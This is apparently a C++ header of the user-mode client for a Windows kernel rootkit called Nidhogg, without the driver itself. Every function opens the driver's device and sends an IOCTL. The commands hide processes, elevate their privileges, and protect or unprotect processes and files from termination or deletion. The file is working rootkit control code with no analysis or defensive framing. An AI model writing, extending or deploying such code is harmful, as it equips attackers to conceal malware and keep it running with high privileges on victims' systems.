#include <Windows.h>
#include <vector>

// ** IOCTL ********************************************************************************************
#define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
// *****************************************************************************************************

// ** General Definitions ******************************************************************************
#define MAX_PIDS 256
#define NIDHOGG_SUCCESS 0
#define NIDHOGG_GENERAL_ERROR 1
#define NIDHOGG_ERROR_CONNECT_DRIVER 2
#define NIDHOGG_ERROR_DEVICECONTROL_DRIVER 3
// ******************************************************************************************************

int NidhoggProcessProtect(std::vector<DWORD> pids) {
    DWORD returned;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_PROCESS,
        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
        nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessUnprotect(std::vector<DWORD> pids) {
    DWORD returned;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_PROCESS,
        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessClearAllProtection() {
    DWORD returned;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION,
        nullptr, 0, nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessHide(std::vector<DWORD> pids) {
    DWORD returned;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_HIDE_PROCESS,
        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggProcessElevate(std::vector<DWORD> pids) {
    DWORD returned;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_ELEVATE_PROCESS,
        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggFileProtect(wchar_t* filePath) {
    DWORD returned;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_FILE,
        (PVOID)filePath, ((DWORD)(wcslen(filePath) + 1)) * sizeof(WCHAR),
        nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }


    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggFileUnprotect(wchar_t* filePath) {
    DWORD returned;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_FILE,
        (PVOID)filePath, ((DWORD)(wcslen(filePath) + 1)) * sizeof(WCHAR),
        nullptr, 0, &returned, nullptr)) {

        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}

int NidhoggFileClearAllProtection() {
    DWORD returned;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hFile == INVALID_HANDLE_VALUE)
        return NIDHOGG_ERROR_CONNECT_DRIVER;

    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION,
        nullptr, 0, nullptr, 0, &returned, nullptr)) {
        CloseHandle(hFile);
        return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
    }

    CloseHandle(hFile);
    return NIDHOGG_SUCCESS;
}
